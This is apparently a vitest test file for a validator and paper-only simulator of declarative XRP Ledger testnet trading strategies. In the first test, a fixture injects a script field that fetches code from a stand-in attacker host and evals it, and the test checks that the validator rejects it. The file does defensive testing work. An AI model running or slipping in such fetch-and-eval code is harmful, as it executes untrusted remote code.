import { describe, expect, it } from "vitest";

import {
  handleStrategySimulate,
  handleStrategyValidate,
} from "../src/ops/strategy";

const owner = "rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh";
const issuer = "rQhWct2fv4Vc4KRjRgMrxa8xPN9Zx9iLKV";
const currency = "524C555344000000000000000000000000000000";

function proposal(): Record<string, unknown> {
  return {
    semantics_version: "harbor.declarative-strategy/1",
    kind: "declarative_strategy_v1",
    network: "testnet",
    account: owner,
    issued_asset: { currency, issuer },
    plan: {
      plan_version: "1",
      trigger: { kind: "interval", interval_seconds: 300 },
      rules: [{
        rule_id: "price-buy",
        all: [{ kind: "price_threshold", side: "ask", comparator: "lte", price: "1" }],
        action: { kind: "fixed_swap", direction: "buy_xrp", order_value: "5" },
      }],
      fallback: { kind: "hold" },
    },
    limits: {
      max_order_value: "10",
      max_daily_value: "20",
      max_cumulative_value: "100",
      min_order_value: "1",
      max_fee_drops: "20",
      max_daily_fee_drops: "100",
      max_cumulative_fee_drops: "1000",
      max_daily_trades: 5,
      max_total_trades: 20,
      cumulative_scope: "owner_network_asset_lifetime",
      max_slippage_bps: 100,
      max_price_impact_bps: 100,
      min_xrp_reserve_drops: "12000000",
      fee_buffer_drops: "1000",
      max_xrp_exposure_drops: "1000000000",
      max_issued_exposure: "1000",
      min_liquidity_value: "5",
      cooldown_seconds: 300,
      max_quote_age_seconds: 20,
      max_ledger_gap: 1,
    },
    execution_mode: "offer_create_fok",
    not_before: "2026-10-22T00:00:00.000Z",
    expires_at: "2026-10-23T00:00:00.000Z",
  };
}

describe("declarative strategy operations", () => {
  it("returns bounded diagnostics for model-injected executable fields", async () => {
    const hostile = {
      ...proposal(),
      plan: {
        ...(proposal().plan as Record<string, unknown>),
        script: "fetch('https://attacker.example').then(eval)",
      },
    };
    const result = await handleStrategyValidate(hostile);
    expect(result.valid).toBe(false);
    expect(result.errors).toEqual(expect.arrayContaining([
      expect.objectContaining({ code: "invalid_shape", path: expect.stringContaining("plan") }),
    ]));
    expect(result).not.toHaveProperty("plan_digest");
  });

  it("labels deterministic preview output as paper-only and not ledger acceptance", async () => {
    const result = await handleStrategySimulate({
      proposal: proposal() as never,
      at: "2026-10-22T00:00:10.000Z",
      observation: {
        account: owner,
        network: "testnet",
        issued_asset: { currency, issuer },
        xrp_balance_drops: "100000000",
        issued_balance: "100",
        bid: "0.995",
        ask: "1",
        executable_liquidity_value: "50",
        fee_drops: "10",
        reserve_base_drops: "10000000",
        reserve_increment_drops: "2000000",
        owner_count: 1,
        daily_value_used: "0",
        cumulative_value_used: "0",
        daily_fee_drops_used: "0",
        cumulative_fee_drops_used: "0",
        daily_trades_used: 0,
        total_trades_used: 0,
        ledger_index: 100,
        quote_ledger_index: 100,
        observed_at: "2026-10-22T00:00:05.000Z",
        global_kill: false,
        unresolved_execution: false,
        grant_active: true,
        policy_active: true,
      },
    });
    expect(result).toMatchObject({
      boundary: "paper_only",
      ledger_acceptance: "not_tested",
      outcome: "order",
      action: "buy_xrp",
      matched_rule_id: "price-buy",
      proposed_value: "5",
    });
  });
});
